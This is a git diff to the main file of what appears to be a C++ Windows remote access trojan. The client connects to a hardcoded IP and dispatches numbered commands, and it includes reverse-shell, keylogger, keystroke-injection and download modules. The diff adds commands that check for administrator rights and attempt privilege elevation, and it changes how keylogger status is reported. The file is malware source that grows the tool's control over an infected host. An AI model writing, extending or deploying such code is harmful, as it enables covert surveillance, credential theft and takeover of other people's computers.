@@ -6,6 +6,7 @@
 #include "video_audio/DeviceEnumerator.h"
 #include <string>
 #include <filesystem>
+#include <shellapi.h>
 #include "stream/Stream.h"
 #include "download/Download.h"
 #include "file/FileManager.h"
@@ -14,6 +15,7 @@
 #include "reverse_shell/ReverseShell.h"
 #include "Keylogger/KeyLogger.h"
 #include "keyboard/KeyboardExecuter.h"
+#include "permission/Permission.h"
 
 #define IP "192.168.1.133"
 
@@ -53,7 +55,10 @@
  */
 
 
-int main() {
+
+
+int main(int argc, char *argv[]) {
+    //if (argc>1)Sleep(std::stoi(argv[argc-1]));
     HANDLE hMutexHandle = CreateMutex(nullptr, TRUE, reinterpret_cast<LPCSTR>(MUTEX));
     if (!(hMutexHandle == nullptr || GetLastError() == ERROR_ALREADY_EXISTS)) {
         bool connectionState = true;
@@ -202,7 +207,7 @@ int main() {
                         }
                         case 15:{
                             std::cout << "GET INFORMATION " << std::endl;
-                            stream.sendString(keyLogger.isRecordingKeys() ? "true":"false");
+                            stream.sendSize(keyLogger.isRecordingKeys());
                             break;
                         }
                         case 16: {
@@ -246,6 +251,19 @@ int main() {
                             std::string keyboardCommand = stream.readString();
                             KeyboardExecuter keyboardExecuter(keyboardCommand);
                             keyboardExecuter.executeSequence();
+                            break;
+                        }
+                        case 19: {
+                            std::cout << Permission::hasAdminPermission() << std::endl;
+                            stream.sendSize(Permission::hasAdminPermission());
+                            break;
+                        }
+                        case 20: {
+                            if (BOOL result = (Permission::elevatePermissions()!=2)) {
+                                stream.sendSize(result);
+                                return 0;
+                            }
+                            stream.sendSize(2);
                             break;
                         }
 
